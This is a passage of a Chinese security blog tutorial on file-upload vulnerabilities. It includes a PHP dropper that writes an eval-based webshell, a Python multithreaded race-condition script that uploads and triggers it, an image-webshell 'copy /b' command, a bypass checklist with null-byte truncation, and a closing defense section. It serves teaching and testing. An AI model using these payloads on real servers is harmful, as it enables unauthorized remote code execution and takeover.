class="string">'name'</span>]));</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span></span><br><span class="line"><span class="php">    unlink($newfile);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
+<p><code>&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&#39;); ?&gt;</code></p>
+<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span>(<span class="title">threading</span>.<span class="title">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        threading.Thread.__init_<span class="number">_</span>(<span class="keyword">self</span>)</span><br><span class="line">        <span class="keyword">self</span>.url = <span class="string">"http://127.0.0.1/code/upload/shell.php"</span></span><br><span class="line">        <span class="keyword">self</span>.uploadUrl = <span class="string">"http://127.0.0.1/code/upload_compete.php"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        print(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(<span class="keyword">self</span>.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span><span class="symbol">:</span></span><br><span class="line">            print(<span class="string">"[*]create file Str3am.php success"</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        file = &#123;<span class="string">"file"</span><span class="symbol">:open</span>(<span class="string">"shell.php"</span>,<span class="string">"r"</span>)&#125;</span><br><span class="line">        requests.post(<span class="keyword">self</span>.uploadUrl, files=file)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>)<span class="symbol">:</span></span><br><span class="line">                <span class="keyword">self</span>._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)<span class="symbol">:</span></span><br><span class="line">                <span class="keyword">self</span>._upload()</span><br><span class="line">                <span class="keyword">self</span>._get()</span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">"__main__"</span><span class="symbol">:</span></span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads)<span class="symbol">:</span></span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads)<span class="symbol">:</span></span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
+
+<p>成功写入 shell</p>
+<p><img src="/2019/01/05/Web_12/65frxezkji7ctjfklsg6loemca.png" alt></p>
+<h3 id="4-2-图片马制作"><a href="#4-2-图片马制作" class="headerlink" title="4.2.图片马制作"></a>4.2.图片马制作</h3><p><code>copy /b 1.jpg+shell.php 2.jpg</code></p>
+<p>注意 <code>/b</code></p>
+<p><img src="/2019/01/05/Web_12/9vj3h81d86cu96lmn4qtqwgkfb.png" alt></p>
+<h2 id="5-解析漏洞"><a href="#5-解析漏洞" class="headerlink" title="5.解析漏洞"></a>5.解析漏洞</h2><p>IIS、Apache、Nginx 解析漏洞</p>
+<p><a href="https://thief.one/2016/09/21/服务器解析漏洞/" target="_blank" rel="noopener">服务器解析漏洞 | nmask</a></p>
+<h2 id="6-利用总结"><a href="#6-利用总结" class="headerlink" title="6.利用总结"></a>6.利用总结</h2><p>首先判断是程序员自己写的上传点，还是编辑器的上传功能</p>
+<p>如果是编辑器上传功能，goolge当前编辑器的漏洞</p>
+<p>如果是程序员写的上传点</p>
+<p>上传一个正常的jpg图片 查看上传点是否可用</p>
+<p>上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）</p>
+<p>上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg</p>
+<p>判断服务器是什么类型，web服务器程序，是什么类型，版本号多少</p>
+<hr>
+<p>测试时的准备工作：</p>
+<p>什么语言？什么容器？什么系统？都什么版本？</p>
+<p>上传文件都可以上传什么格式的文件？还是允许上传任意类型？</p>
+<p>上传的文件会不会被重命名或者二次渲染？</p>
+<h2 id="7-防御"><a href="#7-防御" class="headerlink" title="7.防御"></a>7.防御</h2><p>① 文件上传目录设置不可执行</p>
+<p>只要 Web 容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响。例如配置 nginx 把上传的文件当做静态资源访问</p>
+<p>② 判断文件类型</p>
+<p>判断文件类型时结合使用 MIME Type 、后缀检查等方式。后缀检查使用白名单方式。同时可对图片进行二次处理或者压缩，如php gd，但是就算使用 php gd 也有绕过方式：<a href="https://secgeek.net/bookfresh-vulnerability/" target="_blank" rel="noopener">https://secgeek.net/bookfresh-vulnerability/</a></p>
+<p>③ 使用随机数改写文件名喝文件路径</p>
+<p>使用随机数，可以增加攻击的成本。同时，像 <code>shell.php.rar.rar</code> 或 <code>corssdomain.xml</code> 这类文件，都会因为文件名被改写而无法成功实施攻击</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="noopener">Web-Security-Learning | CHYbeta</a></li>
+<li><a href="http://jdrops.dropsec.xyz/2017/07/17/文件上传漏洞总结/" target="_blank" rel="noopener">文件上传漏洞总结 | J_drops</a></li>
+<li>JoyChou 文件上传骚套路：<a href="https://www.freebuf.com/column/174931.html" target="_blank" rel="noopener">文件上传和WAF的攻与防 | JoyChou</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2019/01/05/Web_12/" title="Web基础漏洞之文件上传">https://jlkl.github.io/2019/01/05/Web_12/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/12/20/Web_11/" rel="prev" title="SWPUCTF 2018 Web两道">
+      <i class="fa fa-chevron-left"></i> SWPUCTF 2018 Web两道
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/02/08/Web_13/" rel="next" title="CTF线下赛AWD新手入门Web篇">
+      CTF线下赛AWD新手入门Web篇 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-前言"><span class="nav-number">1.</span> <span class="nav-text">1.前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-概述"><span class="nav-number">2.</span> <span class="nav-text">2.概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-上传检测"><span class="nav-number">3.</span> <span class="nav-text">3.上传检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-客户端检测"><span class="nav-number">3.1.</span> <span class="nav-text">3.1.客户端检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-服务端检验"><span class="nav-number">3.2.</span> <span class="nav-text">3.2.服务端检验</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-1-MIME类型检测"><span class="nav-number">3.2.1.</span> <span class="nav-text">3.2.1.MIME类型检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-2-文件扩展名检测"><span class="nav-number">3.2.2.</span> <span class="nav-text">3.2.2.文件扩展名检测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-2-1-黑名单检测"><span class="nav-number">3.2.2.1.</span> <span class="nav-text">3.2.2.1.黑名单检测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-2-2-白名单检测"><span class="nav-number">3.2.2.2.</span> <span class="nav-text">3.2.2.2.白名单检测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-2-3-绕过方法"><span class="nav-number">3.2.2.3.</span> <span class="nav-text">3.2.2.3.绕过方法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-3-服务端文件内容检测"><span class="nav-number">3.2.3.</span> <span class="nav-text">3.2.3.服务端文件内容检测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-3-1-文件头检测"><span class="nav-number">3.2.3.1.</span> <span class="nav-text">3.2.3.1.文件头检测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-3-2-文件相关信息检测"><span class="nav-number">3.2.3.2.</span> <span class="nav-text">3.2.3.2.文件相关信息检测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-3-3-绕过方法"><span class="nav-number">3.2.3.3.</span> <span class="nav-text">3.2.3.3.绕过方法</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-其他"><span class="nav-number">4.</span> <span class="nav-text">4.其他</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-竞争上传"><span class="nav-number">4.1.</span> <span class="nav-text">4.1.竞争上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-图片马制作"><span class="nav-number">4.2.</span> <span class="nav-text">4.2.图片马制作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-解析漏洞"><span class="nav-number">5.</span> <span class="nav-text">5.解析漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-利用总结"><span class="nav-number">6.</span> <span class="nav-text">6.利用总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-防御"><span class="nav-number">7.</span> <span class="nav-text">7.防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">8.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am"
+      src="/images/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http:&#x2F;&#x2F;0xmj.github.io&#x2F;" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sn1per&#x2F;" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">218k</span>
+</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async src="/js/cursor/love.min.js"></script>
+
+
+
+
+  <script src="/js/cursor/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv"></span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv"></span>  次回眸才与你相遇
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
